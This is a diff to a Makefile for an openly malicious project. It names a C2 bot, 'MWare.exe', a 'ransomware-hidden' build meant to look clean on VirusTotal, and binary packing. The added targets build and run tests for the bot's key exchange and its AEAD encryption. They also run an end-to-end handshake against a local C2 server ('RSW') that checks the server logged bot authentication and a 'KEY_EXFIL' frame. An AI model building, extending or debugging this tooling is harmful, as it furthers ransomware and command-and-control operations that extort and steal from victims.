@@ -3,6 +3,11 @@
 # ============================================================================
 # Commands:
 #   make            — Compile MWare.exe (release)
+#   make test       — Build + run the test suite (kex, crypto, e2e handshake)
+#   make test-kex   — Key exchange unit tests (RFC vectors)
+#   make test-crypto— AEAD + file-layer unit tests
+#   make test-e2e   — Full ECDH handshake against a live ./RSW
+#   make console    — Compile headless sys_check.exe (sandbox testing)
 #   make debug      — Compile with debug symbols
 #   make packed     — Run build_v5.py to create packed binary
 #   make clean      — Remove all compiled binaries
@@ -139,11 +144,73 @@ TEST_CFLAGS  = -std=c++17 -O2 -s -Wall -Wextra -static -static-libgcc -static-li
                -DHEADLESS -mconsole -I MWare/
 TEST_LDFLAGS = -lws2_32 -lpsapi -lbcrypt -Wl,--strip-all
 
-test: $(TEST_SRCS)
-	@echo "[*] Building headless test binary (no GUI)..."
+console: $(TEST_SRCS)
+	@echo "[*] Building headless console binary (no GUI)..."
 	$(CC) $(TEST_CFLAGS) $(TEST_SRCS) -o $(TEST_TARGET) $(TEST_LDFLAGS)
 	@echo "[+] Built: $(TEST_TARGET) ($(shell ls -lh $(TEST_TARGET) 2>/dev/null | awk '{print $$5}') console, headless, raw TCP:8080)"
 	@echo "[!] No wxWidgets, no GUI — pure console C2 bot for sandbox testing."
+
+# ============================================================================
+# Test suite — the real tests live in tests/, these targets wire them up.
+# ============================================================================
+# Binaries land in build/tests (git-ignored) so the repo root stays clean.
+TEST_BIN_DIR = build/tests
+TEST_CXX     = clang++
+TEST_CXXFLAGS = -std=c++17 -O1 -Wall -Wextra -I MWare/
+
+# Default suite: fast unit tests + the live handshake round-trip.
+# Port 8080 must be free — test-e2e binds it.
+test: test-kex test-crypto test-e2e
+	@echo "[+] All test suites passed"
+
+# Key exchange: SHA-256 / HMAC / HKDF / X25519 / session key / mutual-auth MACs.
+test-kex: tests/test_kex.cpp MWare/keyexchange.cpp MWare/crypto.cpp
+	@mkdir -p $(TEST_BIN_DIR)
+	@echo "[*] test-kex: key exchange (RFC vectors)..."
+	$(TEST_CXX) $(TEST_CXXFLAGS) tests/test_kex.cpp MWare/keyexchange.cpp MWare/crypto.cpp \
+		-o $(TEST_BIN_DIR)/test_kex
+	@$(TEST_BIN_DIR)/test_kex
+
+# Symmetric layer: ChaCha20 / Poly1305 / AEAD failure modes / file encrypt-decrypt.
+test-crypto: tests/test_crypto.cpp MWare/crypto.cpp
+	@mkdir -p $(TEST_BIN_DIR)
+	@echo "[*] test-crypto: AEAD + file layer..."
+	$(TEST_CXX) $(TEST_CXXFLAGS) tests/test_crypto.cpp MWare/crypto.cpp \
+		-o $(TEST_BIN_DIR)/test_crypto
+	@$(TEST_BIN_DIR)/test_crypto
+
+# End-to-end: starts ./RSW on :8080 with a throwaway PSK, runs the bot-side
+# handshake (BOT_CONNECT → SESSION_PUB → CLIENT_PUB+confirm → AUTH_OK →
+# AEAD KEY_EXFIL), then shuts the server down and verifies what it logged.
+test-e2e: RSW tests/test_e2e_handshake.cpp
+	@mkdir -p $(TEST_BIN_DIR)
+	@echo "[*] test-e2e: handshake against live RSW..."
+	$(TEST_CXX) $(TEST_CXXFLAGS) tests/test_e2e_handshake.cpp MWare/keyexchange.cpp \
+		MWare/crypto.cpp -o $(TEST_BIN_DIR)/test_e2e_handshake
+	@PSK="mware-e2e-$$$$-$$RANDOM"; \
+	LOG="$(TEST_BIN_DIR)/rsw_e2e.log"; \
+	sleep 120 | RSW_PSK="$$PSK" ./RSW > "$$LOG" 2>&1 & \
+	SRV=$$!; \
+	i=0; while [ $$i -lt 50 ]; do \
+		grep -q "listening on" "$$LOG" 2>/dev/null && break; \
+		sleep 0.2; i=$$((i+1)); \
+	done; \
+	if ! grep -q "listening on" "$$LOG" 2>/dev/null; then \
+		echo "[!] RSW failed to start (port 8080 busy?)"; cat "$$LOG"; \
+		pkill -P $$SRV 2>/dev/null; kill $$SRV 2>/dev/null; exit 1; \
+	fi; \
+	$(TEST_BIN_DIR)/test_e2e_handshake "$$PSK"; RC=$$?; \
+	sleep 0.5; \
+	pkill -P $$SRV 2>/dev/null; kill $$SRV 2>/dev/null; wait $$SRV 2>/dev/null; \
+	if ! grep -q "Bot authenticated: E2E_TEST_BOT" "$$LOG"; then \
+		echo "[!] server did not log the authenticated bot"; cat "$$LOG"; RC=1; \
+	fi; \
+	if ! grep -q "KEY_EXFIL" "$$LOG"; then \
+		echo "[!] server did not capture the KEY_EXFIL frame"; RC=1; \
+	fi; \
+	if [ $$RC -eq 0 ]; then echo "ok   server logged auth + key exfil"; \
+	else echo "FAIL e2e round-trip"; fi; \
+	exit $$RC
 
 # ============================================================================
 # VT build — headless, silent, ransomware-hidden (VT_CLEAN)
@@ -213,9 +280,10 @@ clean:
 	rm -f /tmp/legit_padding.bin
 	rm -f .padding_cache.bin
 	rm -f *_prev_build_macho
+	rm -rf $(TEST_BIN_DIR)
 	@echo "[+] Clean complete"
 
 # ============================================================================
 # Phony targets
 # ============================================================================
-.PHONY: all gui inject debug packed packed-vt vt syntax list clean mac cert test
+.PHONY: all gui inject debug packed packed-vt vt syntax list clean mac cert console test test-kex test-crypto test-e2e
